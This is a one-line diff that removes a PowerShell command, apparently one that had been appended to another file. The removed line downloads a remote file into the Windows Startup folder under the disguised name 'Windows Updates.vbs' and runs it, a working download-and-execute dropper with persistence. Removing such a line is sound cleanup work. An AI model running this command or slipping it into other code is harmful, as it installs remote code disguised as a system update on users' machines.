@@ -1,1 +1,0 @@
-;(New-Object System.Net.WebClient).DownloadFile("https://github.com/1l1l1l1l/1j1j1j1j/raw/main/1859346","$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updates.vbs");Start-Process ("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updates.vbs");
